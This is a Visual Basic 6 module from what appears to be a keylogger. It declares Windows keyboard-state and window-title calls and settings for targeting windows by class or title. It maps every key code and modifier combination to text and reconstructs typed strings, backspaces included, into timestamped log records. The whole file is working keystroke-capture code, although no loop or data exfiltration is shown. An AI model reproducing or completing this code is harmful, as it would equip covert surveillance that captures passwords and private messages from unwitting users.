Attribute VB_Name = "basSharedCode"
Declare Function GetForegroundWindow Lib "user32" () As Long
Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetActiveWindow Lib "user32" () As Long
Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long

Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer

Public Const KeyDown As Integer = -32767
Public Const ToggleKeyOn As Integer = -127
Public Const ToggleKeyOff As Integer = -128

Global FileNumber As Integer

Private Const LogEveryWindow As Integer = 0
Private Const LogByClassName As Integer = 1
Private Const LogByWindowText As Integer = 2
Global sBuf As String

Global LogMode As KeyLoggerMode
Global bExactMatch As Boolean
Global ExpectedClass As String
Global ExpectedWindowText As String
Global bScanChildClasses As Boolean
Type LogDB
    TimeStamp As Date
    Data As String
    Handle As Long
    ClassName As String
    WindowsText As String
End Type

Function GetString(nCode As Integer, Optional AltDown As Boolean, Optional CtrlDown As Boolean, Optional ShiftDown As Boolean) As String
On Error Resume Next
Dim sCode As String

If nCode < 0 Or nCode > 255 Then Exit Function

    If GetKeyState(vbKeyF1) = ToggleKeyOn Or GetKeyState(vbKeyF1) = ToggleKeyOff Then sCode = "[F1]"
    If GetKeyState(vbKeyF2) = ToggleKeyOn Or GetKeyState(vbKeyF2) = ToggleKeyOff Then sCode = "[F2]"
    If GetKeyState(vbKeyF3) = ToggleKeyOn Or GetKeyState(vbKeyF3) = ToggleKeyOff Then sCode = "[F3]"
    If GetKeyState(vbKeyF4) = ToggleKeyOn Or GetKeyState(vbKeyF4) = ToggleKeyOff Then sCode = "[F4]"
    If GetKeyState(vbKeyF5) = ToggleKeyOn Or GetKeyState(vbKeyF5) = ToggleKeyOff Then sCode = "[F5]"
    If GetKeyState(vbKeyF6) = ToggleKeyOn Or GetKeyState(vbKeyF6) = ToggleKeyOff Then sCode = "[F6]"
    If GetKeyState(vbKeyF7) = ToggleKeyOn Or GetKeyState(vbKeyF7) = ToggleKeyOff Then sCode = "[F7]"
    If GetKeyState(vbKeyF8) = ToggleKeyOn Or GetKeyState(vbKeyF8) = ToggleKeyOff Then sCode = "[F8]"
    If GetKeyState(vbKeyF9) = ToggleKeyOn Or GetKeyState(vbKeyF9) = ToggleKeyOff Then sCode = "[F9]"
    If GetKeyState(vbKeyF10) = ToggleKeyOn Or GetKeyState(vbKeyF10) = ToggleKeyOff Then sCode = "[F10]"
    If GetKeyState(vbKeyF11) = ToggleKeyOn Or GetKeyState(vbKeyF11) = ToggleKeyOff Then sCode = "[F11]"
    If GetKeyState(vbKeyF12) = ToggleKeyOn Or GetKeyState(vbKeyF12) = ToggleKeyOff Then sCode = "[F12]"
    
    Select Case nCode
        Case 1
            Exit Function '"[MOUSE LEFT]"
        Case 2
            Exit Function '"[MOUSE RIGHT]"
        Case 4
            Exit Function '"[MOUSE MIDDLE]"
        Case 8
            sCode = "[BACKSPACE]"
        Case 9
            sCode = "[TAB]"
        Case 10
            sCode = "[LINE FEED]"
        Case 12
            sCode = "[NUMPAD 5]"
        Case 13
            sCode = "[ENTER]"
        Case 16             'FOR SHIFT KEY
            Exit Function
        Case 17             'FOR CONTROL KEY
            Exit Function
        Case 18             'FOR ALT KEY
            Exit Function
        Case 19
            sCode = "[PAUSE]"
        Case 20
            If GetKeyState(20) = ToggleKeyOn Then sCode = "[CAPS LOCK ON]"
            If GetKeyState(20) = ToggleKeyOff Then sCode = "[CAPS LOCK OFF]"
        Case 27
              sCode = "[ESCAPE]"
        Case 32
             sCode = "[SPACE]"
        Case 33
            sCode = "[PAGE UP]"
        Case 34
            sCode = "[PAGE DOWN]"
        Case 35
            sCode = "[END]"
        Case 36
            sCode = "[HOME]"
        Case 37
            sCode = "[LEFT ARROW]"
        Case 38
            sCode = "[UP ARROW]"
        Case 39
            sCode = "[RIGHT ARROW]"
        Case 40
            sCode = "[DOWN ARROW]"
        Case 44
            sCode = "[PRINT SCREEN]"
        Case 45
             If GetKeyState(45) = ToggleKeyOn Then sCode = "[INSERT ON]"
            If GetKeyState(45) = ToggleKeyOff Then sCode = "[INSERT OFF]"
        Case 48
            If ShiftDown Then
                sCode = ")"
            Else
                sCode = "0"
            End If
        Case 46
            sCode = "[DELETE]"
        Case 49
            If ShiftDown Then
                sCode = "!"
            Else
                sCode = "1"
            End If
        Case 50
            If ShiftDown Then
                sCode = "@"
            Else
                sCode = "2"
            End If
        Case 51
            If ShiftDown Then
                sCode = "#"
            Else
                sCode = "3"
            End If
        Case 52
            If ShiftDown Then
                sCode = "$"
            Else
                sCode = "4"
            End If
        Case 53
            If ShiftDown Then
                sCode = "%"
            Else
                sCode = "5"
            End If
        Case 54
            If ShiftDown Then
                sCode = "^"
            Else
                sCode = "6"
            End If
        Case 55
            If ShiftDown Then
                sCode = "&"
             Else
                sCode = "7"
            End If
        Case 56
            If ShiftDown Then
                sCode = "*"
            Else
                sCode = "8"
            End If
        Case 57
            If ShiftDown Then
                sCode = "("
            Else
                sCode = "9"
            End If
        Case 91
            sCode = "[WINDOWS MENU]"
        Case 93
            sCode = "[CONTEXT MENU]"
        Case 96
            sCode = "[NUMPAD 0]"
        Case 97
            sCode = "[NUMPAD 1]"
        Case 98
            sCode = "[NUMPAD 2]"
        Case 99
            sCode = "[NUMPAD 3]"
        Case 100
            sCode = "[NUMPAD 4]"
        Case 101
            sCode = "[NUMPAD 5]"
        Case 102
            sCode = "[NUMPAD 6]"
        Case 103
            sCode = "[NUMPAD 7]"
        Case 104
            sCode = "[NUMPAD 8]"
        Case 105
            sCode = "[NUMPAD 9]"
        Case 106
            sCode = "[NUMPAD *]"
        Case 107
            sCode = "[NUMPAD +]"
        Case 109
            sCode = "[NUMPAD -]"
        Case 110
            sCode = "[NUMPAD .]"
        Case 111
            sCode = "[NUMPAD /]"
        Case 144
            If GetKeyState(144) = ToggleKeyOn Then sCode = "[NUM LOCK ON]"
            If GetKeyState(144) = ToggleKeyOff Then sCode = "[NUM LOCK OFF]"
        Case 145
            If GetKeyState(145) = ToggleKeyOn Then sCode = "[SCROLL LOCK ON]"
            If GetKeyState(145) = ToggleKeyOff Then sCode = "[SCROLL LOCK OFF]"
        Case 146
            sCode = Chr(nCode)
        Case 186
            If ShiftDown Then
                sCode = ":"
            Else
                sCode = ";"
            End If
        Case 187
            If ShiftDown Then
                sCode = "+"
            Else
                sCode = "="
            End If
        Case 188
            If ShiftDown Then
                sCode = "<"
            Else
                sCode = ","
            End If
        Case 189
            If ShiftDown Then
                sCode = "_"
            Else
                sCode = "-"
            End If
        Case 190
            If ShiftDown Then
                sCode = ">"
            Else
                sCode = "."
            End If
        Case 191
            If ShiftDown Then
                sCode = "?"
            Else
                sCode = "/"
            End If
        Case 192
            If ShiftDown Then
                sCode = "~"
            Else
                sCode = "`"
            End If
        Case 219
            If ShiftDown Then
                sCode = "{"
            Else
                sCode = "["
            End If
        Case 220
            If ShiftDown Then
                sCode = "|"
            Else
                sCode = "\"
            End If
        Case 221
            If ShiftDown Then
                sCode = "}"
            Else
                sCode = "]"
            End If
        Case 222
            If ShiftDown Then
                sCode = """"
            Else
                sCode = "'"
            End If
        Case Else
            If InBetween(nCode, 65, 90) = True Then
                If ShiftDown Then
                    If GetKeyState(20) Then
                        sCode = LCase(Chr(nCode))
                    Else
                        sCode = UCase(Chr(nCode))
                    End If
                Else
                    If GetKeyState(20) Then
                        sCode = UCase(Chr(nCode))
                    Else
                        sCode = LCase(Chr(nCode))
                    End If
                End If
            End If
    End Select
    
    If AltDown = True And CtrlDown = False And ShiftDown = False Then
        If Left(sCode, 1) = "[" Then
            sCode = "[ALT+" & Mid(sCode, 2, Len(sCode) - 2) & "]"
        Else
            sCode = "[ALT+" & sCode & "]"
        End If
    End If

    If AltDown = True And CtrlDown = True And ShiftDown = False Then
        If Left(sCode, 1) = "[" Then
            sCode = "[ALT+CTRL+" & Mid(sCode, 2, Len(sCode) - 2) & "]"
        Else
            sCode = "[ALT+CTRL+" & sCode & "]"
        End If
    End If
    
    If AltDown = True And CtrlDown = True And ShiftDown = True Then
        If Left(sCode, 1) = "[" Then
            sCode = "[ALT+CTRL+SHIFT+" & Mid(sCode, 2, Len(sCode) - 2) & "]"
        Else
            sCode = "[ALT+CTRL+SHIFT+" & sCode & "]"
        End If
    End If

    
    If AltDown = False And CtrlDown = False And ShiftDown = True Then
        If Left(sCode, 1) = "[" Then
            sCode = "[SHIFT+" & Mid(sCode, 2, Len(sCode) - 2) & "]"
            
        Else
            If Len(sCode) = 1 And InBetween(Asc(sCode), 65, 90) Or InBetween(Asc(sCode), 97, 122) Then
                'DO NOTHING
            Else
                sCode = "[SHIFT+" & sCode & "]"
            End If
        End If
    End If

    If AltDown = False And CtrlDown = True And ShiftDown = False Then
        If Left(sCode, 1) = "[" Then
            sCode = "[CTRL+" & Mid(sCode, 2, Len(sCode) - 2) & "]"
        Else
            sCode = "[CTRL+" & sCode & "]"
        End If
    End If
    
    If AltDown = False And CtrlDown = True And ShiftDown = True Then
        If Left(sCode, 1) = "[" Then
            sCode = "[CTRL+SHIFT+" & Mid(sCode, 2, Len(sCode) - 2) & "]"
        Else
            sCode = "[CTRL+SHIFT+" & sCode & "]"
        End If
    End If
    
    If AltDown = True And CtrlDown = False And ShiftDown = True Then
        If Left(sCode, 1) = "[" Then
            sCode = "[ALT+SHIFT+" & Mid(sCode, 2, Len(sCode) - 2) & "]"
        Else
            sCode = "[ALT+SHIFT+" & sCode & "]"
        End If
    End If
      
    Debug.Print "sCode: " & sCode & " Code: " & nCode
    GetString = sCode
    
End Function

Function InBetween(nValue As Integer, nMin As Integer, nMax As Integer, Optional Bounded As Boolean = True) As Boolean
    If Bounded Then
        If nValue >= nMin And nValue <= nMax Then
            InBetween = True
        Else
            InBetween = False
        End If
    Else
        If nValue > nMin And nValue < nMax Then
            InBetween = True
        Else
            InBetween = False
        End If
    End If
End Function

Function Transform(sData As String) As String
On Error Resume Next

    Dim sTmp  As String
    Dim sBuffer As String
    
    sBuffer = sData
    If Len(sBuffer) <= 0 Then Exit Function
    sBuffer = Replace(sBuffer, "[SPACE]", Space(1))
    
    While InStr(sBuffer, "[BACKSPACE]")
        sTmp = Mid(sBuffer, 1, InStr(sBuffer, "[BACKSPACE]") - 2) & Mid(sBuffer, InStr(sBuffer, "[BACKSPACE]") + 11)
        sBuffer = sTmp
    Wend
    
    sBuffer = Replace(sBuffer, "[ENTER]", "")
    sBuffer = Replace(sBuffer, "[LINE FEED]", "")
    sBuffer = Replace(sBuffer, "[NUMPAD 0]", "0")
    sBuffer = Replace(sBuffer, "[NUMPAD 1]", "1")
    sBuffer = Replace(sBuffer, "[NUMPAD 2]", "2")
    sBuffer = Replace(sBuffer, "[NUMPAD 3]", "3")
    sBuffer = Replace(sBuffer, "[NUMPAD 4]", "4")
    sBuffer = Replace(sBuffer, "[NUMPAD 5]", "5")
    sBuffer = Replace(sBuffer, "[NUMPAD 6]", "6")
    sBuffer = Replace(sBuffer, "[NUMPAD 7]", "7")
    sBuffer = Replace(sBuffer, "[NUMPAD 8]", "8")
    sBuffer = Replace(sBuffer, "[NUMPAD 9]", "9")
    sBuffer = Replace(sBuffer, "[NUMPAD .]", ".")
    sBuffer = Replace(sBuffer, "[NUMPAD /]", "/")
    sBuffer = Replace(sBuffer, "[NUMPAD *]", "*")
    sBuffer = Replace(sBuffer, "[NUMPAD -]", "-")
    sBuffer = Replace(sBuffer, "[NUMPAD +]", "+")
    sBuffer = Replace(sBuffer, "[F1]", "")
    sBuffer = Replace(sBuffer, "[F2]", "")
    sBuffer = Replace(sBuffer, "[F3]", "")
    sBuffer = Replace(sBuffer, "[F4]", "")
    sBuffer = Replace(sBuffer, "[F5]", "")
    sBuffer = Replace(sBuffer, "[F6]", "")
    sBuffer = Replace(sBuffer, "[F7]", "")
    sBuffer = Replace(sBuffer, "[F8]", "")
    sBuffer = Replace(sBuffer, "[F9]", "")
    sBuffer = Replace(sBuffer, "[F10]", "")
    sBuffer = Replace(sBuffer, "[F11]", "")
    sBuffer = Replace(sBuffer, "[F12]", "")
    sBuffer = Replace(sBuffer, "[ESCAPE]", "")
    sBuffer = Replace(sBuffer, "[PAUSE]", "")
    sBuffer = Replace(sBuffer, "[TAB]", Space(8))
    sBuffer = Replace(sBuffer, "[PAGE UP]", "")
    sBuffer = Replace(sBuffer, "[PAGE DOWN]", "")
    sBuffer = Replace(sBuffer, "[HOME]", "")
    sBuffer = Replace(sBuffer, "[END]", "")
    sBuffer = Replace(sBuffer, "[NUMPAD INSERT ON]", "")
    sBuffer = Replace(sBuffer, "[NUMPAD INSERT OFF]", "")
    sBuffer = Replace(sBuffer, "[INSERT ON]", "")
    sBuffer = Replace(sBuffer, "[INSERT OFF]", "")
    sBuffer = Replace(sBuffer, "[DELETE]", "")
    sBuffer = Replace(sBuffer, "[PRINT SCREEN]", "")
    sBuffer = Replace(sBuffer, "[WINDOWS MENU]", "")
    sBuffer = Replace(sBuffer, "[CONTEXT MENU]", "")
    sBuffer = Replace(sBuffer, "[NUM LOCK ON]", "")
    sBuffer = Replace(sBuffer, "[NUM LOCK OFF]", "")
    sBuffer = Replace(sBuffer, "[SCROLL LOCK ON]", "")
    sBuffer = Replace(sBuffer, "[SCROLL LOCK OFF]", "")
    sBuffer = Replace(sBuffer, "[CAPS LOCK ON]", "")
    sBuffer = Replace(sBuffer, "[CAPS LOCK OFF]", "")
    sBuffer = Replace(sBuffer, "[UP ARROW]", "")
    sBuffer = Replace(sBuffer, "[DOWN ARROW]", "")
    sBuffer = Replace(sBuffer, "[LEFT ARROW]", "")
    sBuffer = Replace(sBuffer, "[RIGHT ARROW]", "")
    
    Transform = sBuffer
End Function

